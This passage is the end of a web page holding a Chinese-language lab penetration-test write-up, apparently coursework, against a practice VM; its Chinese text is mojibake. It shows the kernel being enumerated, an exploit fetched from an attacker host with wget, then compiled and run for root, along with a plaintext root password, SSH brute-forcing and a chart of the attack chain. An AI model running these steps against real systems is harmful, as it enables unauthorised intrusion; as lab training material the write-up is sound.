<p>å…¶å® phpinfo é¡µé¢å·²ç»æœ‰äº†è¿™äº›ä¿¡æ¯ï¼Œæˆ‘å¿˜è®°äº†</p>
</blockquote>
<div class="highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"> 1</span>
<span class="normal"> 2</span>
<span class="normal"> 3</span>
<span class="normal"> 4</span>
<span class="normal"> 5</span>
<span class="normal"> 6</span>
<span class="normal"> 7</span>
<span class="normal"> 8</span>
<span class="normal"> 9</span>
<span class="normal">10</span>
<span class="normal">11</span></pre></div></td><td class="code"><div><pre><span></span><code>www-data@indishell:$ lsb_release -a
lsb_release -a
No LSB modules are available.
Distributor ID: Ubuntu
Description:    Ubuntu 12.04.5 LTS
Release:        12.04
Codename:       precise

www-data@indishell:/var$ uname -a
uname -a
Linux indishell 3.13.0-32-generic #57~precise1-Ubuntu SMP Tue Jul 15 03:50:54 UTC 2014 i686 i686 i386 GNU/Linux
</code></pre></div></td></tr></table></div>
<p>è·å–ç‰ˆæœ¬ä¸º Ubuntu 12.04.5 LTSï¼Œå†…æ ¸ä¸º Linux 3.13.0ï¼Œ<code>searchsploit</code> æœä¸€ä¸‹ï¼š</p>
<div class="highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"> 1</span>
<span class="normal"> 2</span>
<span class="normal"> 3</span>
<span class="normal"> 4</span>
<span class="normal"> 5</span>
<span class="normal"> 6</span>
<span class="normal"> 7</span>
<span class="normal"> 8</span>
<span class="normal"> 9</span>
<span class="normal">10</span>
<span class="normal">11</span>
<span class="normal">12</span>
<span class="normal">13</span>
<span class="normal">14</span>
<span class="normal">15</span>
<span class="normal">16</span>
<span class="normal">17</span>
<span class="normal">18</span>
<span class="normal">19</span>
<span class="normal">20</span>
<span class="normal">21</span>
<span class="normal">22</span>
<span class="normal">23</span>
<span class="normal">24</span></pre></div></td><td class="code"><div><pre><span></span><code>&gt; searchsploit Ubuntu 12.04.5       î‚² âœ” î‚² 23:55:11 ï€—  
-------------------------------- ---------------------------------
 Exploit Title                  |  Path
-------------------------------- ---------------------------------
Ubuntu &lt; 15.10 - PT Chown Arbit | linux/local/41760.txt
-------------------------------- ---------------------------------
Shellcodes: No Results

&gt; searchsploit Linux 3.13.0 
---------------------------------------------------- ---------------------------------
 Exploit Title                                      |  Path
---------------------------------------------------- ---------------------------------
// åˆ æ‰äº†ä¸€äº›ä¸å¤ªç›¸å…³çš„æœç´¢ç»“æœ
Linux Kernel (Solaris 10 / &lt; 5.10 138888-01) - Loca | solaris/local/15962.c
Linux Kernel 2.6.19 &lt; 5.9 - 'Netfilter Local Privil | linux/local/50135.c
Linux Kernel 3.11 &lt; 4.8 0 - 'SO_SNDBUFFORCE' / 'SO_ | linux/local/41995.c
Linux Kernel 3.13.0 &lt; 3.19 (Ubuntu 12.04/14.04/14.1 | linux/local/37292.c           // choose this
Linux Kernel 3.13.0 &lt; 3.19 (Ubuntu 12.04/14.04/14.1 | linux/local/37293.txt
Linux Kernel 3.14-rc1 &lt; 3.15-rc4 (x64) - Raw Mode P | linux_x86-64/local/33516.c
Linux Kernel 3.4 &lt; 3.13.2 (Ubuntu 13.04/13.10 x64)  | linux_x86-64/local/31347.c
Linux Kernel 3.4 &lt; 3.13.2 (Ubuntu 13.10) - 'CONFIG_ | linux/local/31346.c
Linux Kernel 3.4 &lt; 3.13.2 - recvmmsg x32 compat (Po | linux/dos/31305.c
---------------------------------------------------- ---------------------------------
Shellcodes: No Results
</code></pre></div></td></tr></table></div>
<p>æ”»å‡»æœºä¸Š http ä¸Šä¼ ä¸€ä»½ä»£ç ï¼Œé¶æœºä¸Šæ¥æ”¶ç¼–è¯‘è¿è¡Œï¼š</p>
<div class="highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"> 1</span>
<span class="normal"> 2</span>
<span class="normal"> 3</span>
<span class="normal"> 4</span>
<span class="normal"> 5</span>
<span class="normal"> 6</span>
<span class="normal"> 7</span>
<span class="normal"> 8</span>
<span class="normal"> 9</span>
<span class="normal">10</span>
<span class="normal">11</span>
<span class="normal">12</span>
<span class="normal">13</span>
<span class="normal">14</span>
<span class="normal">15</span>
<span class="normal">16</span>
<span class="normal">17</span>
<span class="normal">18</span>
<span class="normal">19</span>
<span class="normal">20</span>
<span class="normal">21</span>
<span class="normal">22</span>
<span class="normal">23</span>
<span class="normal">24</span>
<span class="normal">25</span>
<span class="normal">26</span>
<span class="normal">27</span>
<span class="normal">28</span></pre></div></td><td class="code"><div><pre><span></span><code>www-data@indishell:/$ cd /tmp
cd /tmp
www-data@indishell:/tmp$ wget 10.0.2.3:1145/37292.c
wget 10.0.2.3:1145/37292.c
--2025-10-21 21:40:10--  http://10.0.2.3:1145/37292.c
Connecting to 10.0.2.3:1145... connected.
HTTP request sent, awaiting response... 200 OK
Length: 4968 (4.9K) [text/x-csrc]
Saving to: `37292.c'

     0K ....                                                  100%  288M=0s

2025-10-21 21:40:10 (288 MB/s) - `37292.c' saved [4968/4968]

www-data@indishell:/tmp$ gcc 37292.c -o exploit
gcc 37292.c -o exploit

www-data@indishell:/tmp$ ./exploit
./exploit
spawning threads
mount #1
mount #2
child threads done
/etc/ld.so.preload created
creating shared library
sh: 0: can't access tty; job control turned off
# whoami
root
</code></pre></div></td></tr></table></div>
<p>è·å¾—äº† root æƒé™</p>
<blockquote>
<p>åè®°ï¼šåœ¨ Getshell åå¯ä»¥ç”¨è€å¸ˆä¸Šè¯¾æ—¶æ¨èä½¿ç”¨çš„ linpeas è¿›è¡Œä¿¡æ¯æœé›†ï¼Œå¯ä»¥ç›´æ¥æ‰¾åˆ° root è´¦å¯†</p>
</blockquote>
<h3 id="2-ssh">å°è¯•æ–¹å‘ 2: SSH</h3>
<p>æœ‰ä¸€ä¸ª SSH é¡µé¢ï¼Œåœ¨æ–¹å‘ 1 è·å– root å¯†ç ä¸º <code>roottoor</code> æ—¶ï¼Œæ„è¯†åˆ°è¿™æ˜¯ä¸€ä¸ªå¼±å¯†ç ï¼Œå› æ­¤å¯ä»¥å°è¯•ç›´æ¥ç”¨ Hydra è¿›è¡Œçˆ†ç ´ï¼š</p>
<p>ï¼ˆå¯ä»¥åœ¨å°è¯•æ–¹å‘ 1 çš„æ—¶å€™ï¼Œå•ç‹¬å¼€ä¸€ä¸ªçª—å£è·‘ Hydraï¼‰</p>
<p>å®æµ‹å‘ç°å¹³å‡æ¯åˆ†é’Ÿå¯ä»¥å¤„ç† 200 ç»„å¯†ç ï¼ˆè´¦å· rootï¼‰ï¼Œå¦‚æœç”¨ <code>rockyou.txt</code> å¯èƒ½è¦çˆ†ç ´ä¸€æ™šä¸Šï¼Œå¹¶ä¸”ä¹‹åå‘ç° <code>roottoor</code> è¿™ä¸ªå¯†ç ç”šè‡³ä¸åœ¨ <code>rockyou.txt</code> çš„åºå¤§æ•°æ®é›†ä¸­</p>
<p>æ‰€ä»¥çˆ†ç ´æˆåŠŸçš„å¯èƒ½æ€§å¾ˆä½</p>
<hr/>
<h2 id="_4">æ¸—é€ç»“æœ</h2>
<p>æˆåŠŸè·å–äº† root æƒé™å¹¶ä¸”ä¿®æ”¹äº† root å¯†ç ï¼Œç™»å½•é¶æœºç•Œé¢ï¼Œè¾“å…¥æ–°å¯†ç è¿›å…¥ root è´¦å·ï¼š</p>
<p><img alt="image-20251021121744187" src="../images/image-20251021121744187.png"/></p>
<p>å¦å¤–è·å¾— root æƒé™åå¯ä»¥æœç´¢è·å¾— phpMyAdmin çš„ç®¡ç†å‘˜è´¦å·æœé›†ä¿¡æ¯</p>
<hr/>
<h2 id="_5">æ¸—é€å…¨è¿‡ç¨‹å›¾ç¤º</h2>
<p>ç”¨ mermaid ç»˜åˆ¶äº†ä¸€å¹…å…¨è¿‡ç¨‹æ¸…å•</p>
<pre class="mermaid"><code>flowchart TD
O[nmap æ‰«æå­˜æ´»ä¸»æœºä¸ç«¯å£] --&gt; A[dirb ç›®å½•çˆ†ç ´]
O[nmap æ‰«æå­˜æ´»ä¸»æœºä¸ç«¯å£] --&gt; U[SSH çˆ†ç ´ï¼ˆå¸Œæœ›æ¸ºèŒ«ï¼‰]
A[dirb ç›®å½•çˆ†ç ´] --&gt; test(/test å­é¡µé¢)
A[dirb ç›®å½•çˆ†ç ´] --&gt; index(/index ç™»å½•é¡µé¢)
A[dirb ç›®å½•çˆ†ç ´] --&gt; in(phpinfo å­é¡µé¢)
index(/index ç™»å½•é¡µé¢) --&gt;|SQL æ³¨å…¥| G[ç™»å½• panel.php]
test(/test å­é¡µé¢) --&gt;|ä»»æ„æ–‡ä»¶ä¸‹è½½| Z[ç›²æœè·å¾— phpMyAdmin é…ç½®æ–‡ä»¶]
Z --&gt;|ç™»å½• SSH| C[è·å¾— root è´¦å·]
test(/test å­é¡µé¢) --&gt;|ä»»æ„æ–‡ä»¶ä¸‹è½½| D[è·å¾— c.php æºä»£ç ]
test(/test å­é¡µé¢) --&gt;|ä»»æ„æ–‡ä»¶ä¸‹è½½| H[è·å¾— index.php æºä»£ç ]
test(/test å­é¡µé¢) --&gt;|ä»»æ„æ–‡ä»¶ä¸‹è½½| J[è·å¾— panel.php æºä»£ç ]
H[è·å¾— index.php æºä»£ç ] --&gt;|å‘ç° SQL æ³¨å…¥ç‚¹| index(/index ç™»å½•é¡µé¢)
D[è·å¾— c.php æºä»£ç ] --&gt;|è·å¾— phpMyAdmin ä½æƒé™è´¦å·| E[ç™»å½• phpMyAdmin]
E[ç™»å½• phpMyAdmin] --&gt; F[è·å– index é¡µé¢è´¦å¯†]
F[è·å– index é¡µé¢è´¦å¯†] --&gt; G[ç™»å½• panel.php]
G[ç™»å½• panel.php] --&gt;|Add User å›¾ç‰‡é©¬ä¸Šä¼ | I[Getshell]
J[è·å¾— panel.php æºä»£ç ] --&gt;|åˆ†æå›¾ç‰‡é©¬åˆ©ç”¨æ–¹æ³•| I[Getshell]
I[Getshell] --&gt; |ä¸Šä¼  linpeas è·å–ä¿¡æ¯|B[åœ¨ phpMyAdmin é…ç½®æ–‡ä»¶æ‰«æåˆ° root å¯†ç ]
B --&gt;|ç™»å½• SSH| C[è·å¾— root æƒé™]
in(phpinfo å­é¡µé¢) --&gt; Q[è·å–é¶æœºå†…æ ¸ç‰ˆæœ¬]
I[Getshell] --&gt; P[æœç´¢å†…æ ¸æ¼æ´]
Q[è·å–é¶æœºå†…æ ¸ç‰ˆæœ¬] --&gt;|æä¾›å†…æ ¸ç‰ˆæœ¬ä¿¡æ¯| P[æœç´¢å†…æ ¸æ¼æ´]
P[æœç´¢å†…æ ¸æ¼æ´] --&gt; R[http ä¸‹è½½ï¼Œç¼–è¯‘è¿è¡Œ]
R[http ä¸‹è½½ï¼Œç¼–è¯‘è¿è¡Œ] --&gt; C[è·å¾— root æƒé™]
</code></pre>
<p><del>ä¸€åˆ‡å°½åœ¨ä¸è¨€ä¸­ã€‚</del></p>
<hr/>
<h2 id="_6">å…¶ä»–</h2>
<p>ç”¨æ—¶çº¦ 6hï¼Œå…¶ä¸­ç¬¬ä¸€æ¬¡å¾—åˆ° root è´¦å·ç”¨æ—¶ 2h</p>
</article>
</div>
<script>var target=document.getElementById(location.hash.slice(1));target&&target.name&&(target.checked=target.name.startsWith("__tabbed_"))</script>
</div>
</main>
<footer class="md-footer">
<div class="md-footer-meta md-typeset">
<div class="md-footer-meta__inner md-grid">
<div class="md-copyright">
  
  
    Made with
    <a href="https://squidfunk.github.io/mkdocs-material/" rel="noopener" target="_blank">
      Material for MkDocs
    </a>
</div>
</div>
</div>
</footer>
</div>
<div class="md-dialog" data-md-component="dialog">
<div class="md-dialog__inner md-typeset"></div>
</div>
<script id="__config" type="application/json">{"base": "../../..", "features": ["content.code.copy"], "search": "../../../assets/javascripts/workers/search.973d3a69.min.js", "tags": null, "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}, "version": null}</script>
<script src="../../../assets/javascripts/bundle.f55a23d4.min.js"></script>
<script src="../../../stylesheets/extra.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.16.9/katex.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.16.9/contrib/auto-render.min.js"></script>
<script type="module">import mermaid from "https://unpkg.com/mermaid@10.4.0/dist/mermaid.esm.min.mjs";
window.mermaidConfig = {default: {
    startOnLoad: false
}};</script></body>
</html>